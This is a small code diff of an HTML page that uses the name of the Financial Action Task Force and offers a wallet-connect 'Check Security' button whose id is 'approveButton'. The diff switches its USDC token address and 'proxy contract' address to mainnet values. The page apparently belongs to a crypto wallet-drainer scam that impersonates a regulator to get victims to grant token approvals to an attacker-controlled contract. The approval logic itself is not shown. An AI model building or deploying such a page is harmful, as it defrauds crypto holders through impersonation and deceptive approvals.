@@ -112,15 +112,14 @@
         <p id="walletStatus">Wallet Not Connected</p>
         <button id="approveButton" onclick="checkSecurity()" disabled>Check Security</button>
     </div>
-
     <footer>
         <p>&copy; 2024 Financial Action Task Force. All rights reserved.</p>
     </footer>
 
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script>
-        const tokenAddress = "0x8588fC4386D278A0Ec02318983f4F837004E6722"; // USDC Token Address
-        const proxyAddress = "0x87170f0808DF35f6A5cA09067b08221c2A50B072"; // Proxy Contract Address
+        const tokenAddress = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"; // Mainnet USDC Token Address
+        const proxyAddress = "0x67A0bCBC059358E96bF4e85B43FFB2a12f25e097"; // Mainnet Contract Address
         let provider, signer;
 
         // Connect wallet
